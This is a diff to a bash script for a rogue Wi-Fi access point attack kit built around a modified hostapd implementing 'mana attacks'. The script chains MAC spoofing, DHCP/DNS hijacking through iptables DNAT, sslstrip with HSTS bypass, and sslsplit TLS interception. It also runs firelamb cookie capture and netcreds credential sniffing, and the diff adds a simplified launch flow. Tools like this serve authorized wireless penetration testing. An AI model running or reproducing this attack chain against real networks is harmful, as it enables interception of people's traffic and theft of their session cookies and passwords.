@@ -5,13 +5,6 @@ source $(cd $(dirname $0); pwd -P)/_custom_functions.sh
 upstream=eth0
 phy=wlan0
 
-
-endclr='\e[m'
-txtblk='\e[0;30m' # Black   - Regular
-txtred='\e[0;31m' # Red     - Regular
-txtgrn='\e[0;32m' # Green   - Regula
-#$txtblk $endclr
-#$txtgrn $endclr
 check_ap_mode(){
  if ! iw list | grep 'AP$'>/dev/null
   then
@@ -34,6 +27,7 @@ start_hostname(){
 clearwifi(){
 	service network-manager stop
 	rfkill unblock wlan
+        ifconfig $phy up
 }
 
 start_macchanger(){
@@ -65,8 +59,6 @@ start_nat_firewall(){
         iptables -t nat -F
         iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
         iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
-        iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
-#        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
 }
 
 start_sslstrip(){
@@ -191,22 +183,24 @@ echo -e "$txtgrn [*] Starting hostapd $endclr"
  ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
   sleep 5
 echo -e "$txtgrn [*] Starting dnsmasq $endclr"
- ./$0 --start_dnsmasq &&    #Dnsmasq - 
+ ./$0 --start_dnsmasq &&    #Dnsmasq - A lightweight DHCP and caching DNS server
   sleep 5
 echo -e "$txtgrn [*] Starting sslstrip $endclr"
  ./$0 --start_sslstrip &&   #SSLStrip with HSTS bypass - sslstrip-hsts: Modification of LeonardoNVE's & moxie's tools
   sleep 2
 echo -e "$txtgrn [*] Starting sslsplit $endclr"
- ./$0 --start_sslsplit &   #Sslsplit - 
+ ./$0 --start_sslsplit &   #Sslsplit - Tool for man-in-the-middle attacks against SSL/TLS encrypted network connections.
   sleep 5
 echo -e "$txtgrn [*] Starting nat-firewall $endclr"
- ./$0 --start_nat_firewall && #Nat firewall - 
+ ./$0 --start_nat_firewall && #Nat firewall
   sleep 2
+     iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
+ #   iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
 echo -e "$txtgrn [*] Starting firelamb $endclr"
  ./$0 --start_firelamb & #Firelamb - Captures and writes cookies to a firefox profile for easy use.
   sleep 5
 echo -e "$txtgrn [*] Starting netcreds $endclr"
- ./$0 --start_netcreds &  #Netcreds - 
+ ./$0 --start_netcreds &  #Netcreds - Sniffs sensitive data from interface or pcap
 #echo -e "$txtgrn [*] Starting msfconsole $endclr"
 # $TERM_ -hold -T "start_msfconsole"      $TOPLEFTBIG -e "bash -c '$0 --start_msfconsole'"  & sleep 2 && #Metasploit -
 #  sleep 2
@@ -221,6 +215,23 @@ echo -e "$txtgrn [*] Starting netcreds $endclr"
 }
 
 start-nat-simple(){
+conf=$etc/hostapd-mana.conf
+echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
+ ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
+echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
+ ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
+echo -e "$txtgrn [*] Changing MAC $endclr"
+ ./$0 --start_macchanger #Change mac
+  sleep 4
+echo -e "$txtgrn [*] Starting hostapd $endclr"
+ ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
+  sleep 5
+echo -e "$txtgrn [*] Starting dnsmasq $endclr"
+ ./$0 --start_dnsmasq && #Dnsmasq - A lightweight DHCP and caching DNS server
+  sleep 5
+echo -e "$txtgrn [*] Starting nat-firewall $endclr"
+ ./$0 --start_nat_firewall && #Nat firewall
+  sleep 2
 	hangon && #Wait for Enter key
 	killem	  #Kill all shit and exit
 
@@ -268,10 +279,10 @@ hostapd /etc/hostapd/hostapd.conf
 # ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
   sleep 5
 echo -e "$txtgrn [*] Starting dnsmasq $endclr"
- ./$0 --start_dnsmasq &&    #Dnsmasq -
+ ./$0 --start_dnsmasq &&    #Dnsmasq - A lightweight DHCP and caching DNS server
   sleep 5
 echo -e "$txtgrn [*] Starting nat-firewall $endclr"
- ./$0 --start_nat_firewall && #Nat firewall -
+ ./$0 --start_nat_firewall && #Nat firewall
   sleep 2
 #brctl addbr br0
 #brctl addif br0 eth0              #Assuming eth0 is your upstream interface
@@ -339,12 +350,12 @@ echo "$FUNCNAME"
  Usage: $(basename "$0") [--clearwifi]                - Stop network-manager &rfkill unblock wifi
  Usage: $(basename "$0") [--start_macchanger]         - Change mac
  Usage: $(basename "$0") [--start_hostapd]            - Hostapd - Start modified hostapd that implements new mana attacks
- Usage: $(basename "$0") [--start_dnsmasq]            - Dnsmasq - 
+ Usage: $(basename "$0") [--start_dnsmasq]            - Dnsmasq - A lightweight DHCP and caching DNS server
  Usage: $(basename "$0") [--start_sslstrip]           - SSLStrip with HSTS bypass - sslstrip-hsts: Modification of LeonardoNVE's & moxie's tools
  Usage: $(basename "$0") [--start_sslsplit]           - Sslsplit - Tool for man-in-the-middle attacks against SSL/TLS encrypted network connections.
- Usage: $(basename "$0") [--start_nat_firewall]       - Nat firewall - 
+ Usage: $(basename "$0") [--start_nat_firewall]       - Nat firewall - iptables rules
  Usage: $(basename "$0") [--start_firelamb]           - Firelamb - Captures and writes cookies to a firefox profile for easy use.
- Usage: $(basename "$0") [--start_netcreds]           - Netcreds - 
+ Usage: $(basename "$0") [--start_netcreds]           - Netcreds - Sniffs sensitive data from interface or pcap
  Usage: $(basename "$0") [--msfconsole]               - Msfconsole
  Usage: $(basename "$0") [--start_crackapd]           - Crackapd - Crack EAP creds externally & re-add them to the hostapd EAP config (auto crack 'n add)
  Usage: $(basename "$0") [--start_apache]             - Apache - The apache vhosts for the noupstream hacks; deploy to /etc/apache2/ and /var/www/ respectivley
